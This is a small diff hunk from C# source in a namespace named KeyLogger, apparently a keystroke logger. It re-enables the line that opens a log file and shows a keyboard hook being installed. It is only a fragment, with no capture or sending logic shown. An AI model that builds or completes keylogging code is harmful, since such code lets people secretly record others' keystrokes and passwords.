@@ -19,7 +19,7 @@ namespace KeyLogger {
 
     public static void Main(string[] args/*, string logFileName*/) {
       /*logFileName = logFilePath;*/
-      /*logFile = File.AppendText(logFileName);
+      logFile = File.AppendText(logFileName);/*
       logFile.AutoFlush = true;
 
       hookId = SetHook(hookProc);
